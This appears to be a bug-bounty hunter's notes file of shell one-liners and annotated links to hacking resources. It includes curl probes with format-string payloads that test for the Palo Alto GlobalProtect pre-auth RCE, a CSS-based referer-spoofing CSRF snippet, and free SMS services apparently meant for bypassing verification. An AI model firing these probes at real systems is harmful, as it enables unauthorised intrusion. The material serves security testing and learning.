<br>```xargs -I $ -P 10 curl -skL -o /dev/null "https://example.com/$" -w "%{http_code} /$\n" < <(printf '%s\n' {1..3})```

<br># Access target directly through IP address
<br>```http://1.2.3.4```
<br>```https://1.2.3.4```

<br># Trim space and newlines on bash variable
<br>```"${i//[$'\t\r\n ']}"```

<br># Extract paths from swagger.json
<br>```cat swagger.json | jq -r '.paths | to_entries[] | .key'```

<br># Free SMS online services
<br>https://receive-sms.cc
<br>https://onlinesim.io

https://gtfobins.github.io/
<br># GTFOBins is a curated list of Unix binaries that can used to bypass local security restrictions in misconfigured systems.

https://www.guyrutenberg.com/2014/05/02/make-offline-mirror-of-a-site-using-wget/
<br># Make Offline Mirror of a Site using wget
<br>```wget -mkEpnp https://www.example.com/```

<br># Referer spoofing
<br>```<base href="https://www.google.com/">```
<br>```<style>```
<br>```@import 'https://CSRF.vulnerable.example/';```
<br>```</style>```

https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html
<br># Check PreAuth RCE on Palo Alto GlobalProtect
<br>```time curl -s -d 'scep-profile-name=%9999999c' https://${HOST}/sslmgr >/dev/null```
<br>```time curl -s -d 'scep-profile-name=%99999999c' https://${HOST}/sslmgr >/dev/null```
<br>```time curl -s -d 'scep-profile-name=%999999999c' https://${HOST}/sslmgr >/dev/null```

https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html
<br># How I Chained 4 Bugs(Features?) into RCE on Amazon Collaboration System (bypass with /..;/)

https://docs.google.com/presentation/d/1jqnpPe0A7L_cVuPe1V0XeW6LOHvMYg5PBqHd96SScJ8/
<br># Routing To Another Backend , Deserve Spending Hours AND Hours On Its So Inspired By @samwcyo's Talk " Attacking Secondary Contexts in Web Applications " , I Have Been Collecting A Lot Of Stuff To PWN This Backend.

https://medium.com/@ricardoiramar/reusing-cookies-23ed4691122b
<br># This is a story how I accidentally found a common vulnerability across similar web applications just by reusing cookies on different subdomains from the same web application.

https://github.com/shieldfy/API-Security-Checklist
<br># Checklist of the most important security countermeasures when designing, testing, and releasing your API.

https://ippsec.rocks
<br># Looking for a video on a specific hacking technique/tool? Searches over 100 hours of my videos to find you the exact spot in the video you are looking for.

https://book.hacktricks.xyz/welcome/hacktricks
<br># Welcome to the page where you will find each hacking trick/technique/whatever I have learnt in CTFs, real life apps, and reading researches and news.

https://github.com/c3l3si4n/godeclutter
<br># Declutters URLs in a lightning fast and flexible way, for improving input for web hacking automations such as crawlers and vulnerability scans.

https://github.com/s0md3v/uro
<br># Using a URL list for security testing can be painful as there are a lot of URLs that have uninteresting/duplicate content; uro aims to solve that.

https://github.com/hakluke/hakscale
<br># Hakscale allows you to scale out shell commands over multiple systems with multiple threads on each system. The key concept is that a master server will push commands to the queue, then multiple worker servers pop commands from the queue and execute them. The output from those commands will then be sent back to the master server.
<br>```hakscale push -p "host:./hosts.txt" -c "echo _host_ | httpx" -t 20```

https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers
<br># In this writeup, I will be covering techniques which can be used to influence web systems and applications in unexpected ways, by abusing HTTP/1.1 hop-by-hop headers. Systems affected by these techniques are likely ones with multiple caches/proxies handling requests before reaching the backend application.

https://github.com/chubin/cheat.sh
<br># Unified access to the best community driven cheat sheets repositories of the world.

https://labs.detectify.com/2022/10/28/hacking-supercharged-how-to-gunnar-andrews/
<br># How to supercharge your hacking: Mindset, workflow, productivity and checklist.

https://github.com/sehno/Bug-bounty
<br># You can find here some resources I use to do bug bounty hunting.

https://wpdemo.net/
<br># WPDemo.net is for WordPress theme designers and plugin developers that want to allow potential customers to test drive their WordPress plugins or themes before buying.

https://searchcode.com/
<br># Search 75 billion lines of code from 40 million projects.

https://github.com/vitalysim/Awesome-Hacking-Resources
<br># A collection of hacking / penetration testing resources to make you better!

https://github.com/infoslack/awesome-web-hacking
<br># A list of web application security.

https://www.youtube.com/watch?v=QSq-aYYQpro
<br># Command-Line Data-Wrangling by Tomnomnom.

https://www.youtube.com/watch?v=s9w0KutMorE
<br># Bug Bounties With Bash by Tomnomnom.

https://github.com/qmacro/teched-jq-talk
<br># These are the notes and code snippets relating to a Community Talk at SAP TechEd 2023 in Bengaluru: Handle JSON like a boss with jq.

https://github.com/clarkvoss/Oneliners-Collection/blob/main/OneLiners.md
<br># Oneliner commands for bug bounties and pentesting.

https://hackerone.com/hacktivity/cve_discovery
<br># The Common Vulnerabilities and Exposures Discovery Index ranks the top CVEs by recency and instances. CVE and EPSS data extracted every 6 hours; ranking updated hourly.

https://www.synacktiv.com/publications/github-actions-exploitation-untrusted-input.html
<br># Each workflow trigger comes with an associated GitHub context, offering comprehensive information about the event that initiated it. This includes details about the user who triggered the event, the branch name, and other relevant contextual information. Certain components of this event data, such as the base repository name, or pull request number, cannot be manipulated or exploited for injection by the user who initiated the event (e.g., in the case of a pull request). This ensures a level of control and security over the information provided by the GitHub context during workflow execution. However, some elements can be controlled by an attacker and should be sanitized before being used.

https://tools.slcyber.io/
<br># Powerful security testing tools and APIs designed for security professionals and researchers.

https://github.com/vavkamil/awesome-bugbounty-tools
<br># A curated list of various bug bounty tools.

https://blog.heckel.io/2013/07/01/how-to-use-mitmproxy-to-read-and-modify-https-traffic-of-your-phone/
<br># Capturing HTTP and HTTPS traffic on your own machine is quite simple: Using tools like Wireshark or Firebug, sniffing the local connections is only a matter of seconds. Capturing and/or altering the HTTP/HTTPS traffic of other machines in your network (such as your smartphone or other laptops) on the other hand is not so easy. Especially sniffing into SSL-secured HTTPS-connections seems impossible at first. Using mitmproxy, however, makes this possible in a very easy and straight forward way.

https://www.praetorian.com/blog/domain-fronting-is-dead-long-live-domain-fronting/
<br># At Black Hat and DEF CON, we demonstrated how red teams could tunnel traffic through everyday collaboration platforms like Zoom and Microsoft Teams, effectively transforming them into covert communication channels for command-and-control. That research highlighted a critical blind spot: defenders rarely block traffic to core business services because doing so would disrupt legitimate operations. This creates a trust gap that attackers can exploit.
